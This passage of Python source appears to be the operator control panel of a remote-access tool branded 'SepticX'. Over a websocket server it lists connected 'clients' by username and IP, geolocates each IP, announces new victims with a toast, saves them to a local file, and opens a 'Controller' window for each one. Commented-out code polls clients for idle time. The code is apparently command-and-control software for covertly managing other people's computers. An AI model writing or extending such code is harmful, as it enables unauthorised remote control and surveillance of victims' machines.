            label.configure(text='Invalid Server Address')
            return

        ws.send(server_key)

        try:
            self.computers = list(set(json.loads(ws.recv())))
        except (websocket.WebSocketException, ValueError, json.JSONDecodeError) as e:
            label.configure(text='Invalid Server Key')
            return

        if not (ws.connected):
            label.configure(text='Invalid Server Key')
            return

        self.ws = ws
        self.server_key = server_key
        self.server_address = server_address

        label.configure(text='Success!')

        for child in self.winfo_children()[1:]:
            child.destroy()

        print(1)

        threading.Thread(target=self.update_computers).start()
        self.menu()

        print(2)

    def update_computers(self):
        ws = self.ws

        while True:
            try:
                self.computers = list(set(json.loads(ws.recv())))
            except json.JSONDecodeError:
                pass

            except (websocket.WebSocketException, TypeError, PermissionError, ConnectionError) as e:
                try:
                    ws.close()
                except (websocket.WebSocketException, PermissionError, ConnectionError):
                    pass

                try:
                    ws = create_connection(f"wss://{self.server_address}/api/ws/computers")
                    ws.send(self.server_key)
                except (json.JSONDecodeError, websocket.WebSocketException, PermissionError, ConnectionError) as e:
                    print(e)

            print("[LOG] New computer: ", self.computers)

            self.ws = ws

    def update_profiles(self, main_frame, computers=None):
        if computers == self.computers:
            self.after(1000, self.update_profiles, main_frame, computers)
            return

        try:
            computers = list(self.computers)
            print(computers)
            table_values = []

            profiles = json.load(open("computers.json", "r+"))
            new_profiles = profiles + computers

            offline_computers = [] # Load stored computers and assume they're offline
            for idx, computer in enumerate(profiles):
                if computer in computers: # If a computer is in the online list it can't be offline
                    continue

                vals = computer.split('|')

                username = vals[0]
                ip_address = vals[1]

                if len(vals) > 2:
                    version = vals[2]

                else:
                    version = "Beta"

                tries = 5
                while tries != 0:
                    
                    try:
                        request = requests.get(f"http://ip-api.com/json/{ip_address}")
                        ipinfo = request.json()
                        
                        if 'country' not in ipinfo:
                            time.sleep(1)
                            tries -= 1
                            continue

                        country = ipinfo['country']
                        break
                    except:
                        tries -= 1
                        time.sleep(1)

                else:
                    country = "Rate Limited"

                offline_computers.append([country, username, ip_address, "Offline", version, "More Options"])


            online_computers = [] # Load connected computers and assume they're online
            for idx, computer in enumerate(computers):
                
                vals = computer.split('|')

                username = vals[0]
                ip_address = vals[1]

                if len(vals) > 2:
                    version = vals[2]

                else:
                    version = "Beta"

                # tries = 3
                # while tries != 0:
                #     idle_time = self.send_command("status", computer, recv=True)
                #     print(f"Idle time of {computer}: {idle_time}")

                #     try:
                #         int(idle_time)
                #     except ValueError:
                #         print(f"Invalid idle time: {idle_time}")
                #         idle_time = 0

                #     tries -= 1

                # if not idle_time or idle_time < 60: # If idle time is less than a minute, assume online
                #     status = "Online"

                # else:
                #     units = [
                #         "seconds",
                #         "minutes",
                #         "hours"
                #     ]

                #     idle_time = int(idle_time)
                #     idx = min(math.floor(math.log(idle_time, 60)), 2)
                #     unit = units[idx]
                #     converted_time = round(idle_time / 60 ** idx, 2)

                #     status = f"Idle: {converted_time} {units}"

                tries = 5
                while tries != 0:
                    
                    try:
                        request = requests.get(f"http://ip-api.com/json/{ip_address}")
                        ipinfo = request.json()
                        
                        if 'country' not in ipinfo:
                            time.sleep(1)
                            tries -= 1
                            continue

                        country = ipinfo['country']
                        break
                    except Exception as e:
                        tries -= 1
                        print(e)
                        time.sleep(1)

                else:
                    country = "Rate Limited"

                if computer not in profiles:
                    threading.Thread(target=self.toast.show_toast, args=("SepticX", f"New client connected! {computer}")).start()

                online_computers.append([country, username, ip_address, "Online", version, "More Options"])

            table_values = [self.header] + online_computers + offline_computers # Put rows together

            print(table_values)

            with open("computers.json", "w+") as file:
                file.write(json.dumps(
                        list(set(new_profiles)),
                        indent = 6
                    ))

            self.table.configure(values=table_values)
        except Exception as e:
            print("ERROR", e)

        finally:
            self.after(0, self.update_profiles, main_frame, computers)

    def click(self, box):
        column = box.get('column')
        row = box.get('row')

        username = self.table.get(row, 1)
        ip_address = self.table.get(row, 2)
        version = self.table.get(row, 4)

        value = self.table.get(row, column)

        if value == " ":
            return

        if column == len(self.header) - 1:

            if version != "Beta":
                Controller(self, f"{username}|{ip_address}|{version}")
            else:
                Controller(self, f"{username}|{ip_address}")

        else:
            self.clipboard_clear() 
            self.clipboard_append(value)


    def menu(self):
        main_frame = customtkinter.CTkScrollableFrame(self, label_text="Clients")

        for i in range(15): # Set 15 rows
            main_frame.rowconfigure(i, weight=1)
        
        for i in range(15): # Set 15 columns
            main_frame.columnconfigure(i, weight=1)

        main_frame.grid(row=1, column=0, padx=20, pady=0, sticky="nsew", columnspan=21, rowspan=18)

        self.header = ["Country", "Username", "Ip Address", "Status", "Version", "Control"]
        self.table = CTkTable.CTkTable(master=main_frame, row=100, column=6, values=[self.header], corner_radius=15, header_color="gray", color_phase="horizontal", command=self.click)
        self.table.grid(row=0, rowspan=1, column=0, columnspan=15, padx=5, pady=0, sticky="nsew")

        # Profile(master=main_frame, title=True, pady=1)
        
        self.after(50, self.update_profiles, main_frame)

    @staticmethod
    def banner():
        print(fade.greenblue("""
   ▄████████    ▄████████    ▄███████▄     ███      ▄█   ▄████████ ▀████    ▐████▀ 
  ███    ███   ███    ███   ███    ███ ▀█████████▄ ███  ███    ███   ███▌   ████▀  
  ███    █▀    ███    █▀    ███    ███    ▀███▀▀██ ███▌ ███    █▀     ███  ▐███    
  ███         ▄███▄▄▄       ███    ███     ███   ▀ ███▌ ███           ▀███▄███▀    
▀███████████ ▀▀███▀▀▀     ▀█████████▀      ███     ███▌ ███           ████▀██▄     
         ███   ███    █▄    ███            ███     ███  ███    █▄    ▐███  ▀███    
   ▄█    ███   ███    ███   ███            ███     ███  ███    ███  ▄███     ███▄  
 ▄████████▀    ██████████  ▄████▀         ▄████▀   █▀   ████████▀  ████       ███▄ 
        """))

if __name__ == "__main__":

    app = App()
    app.mainloop()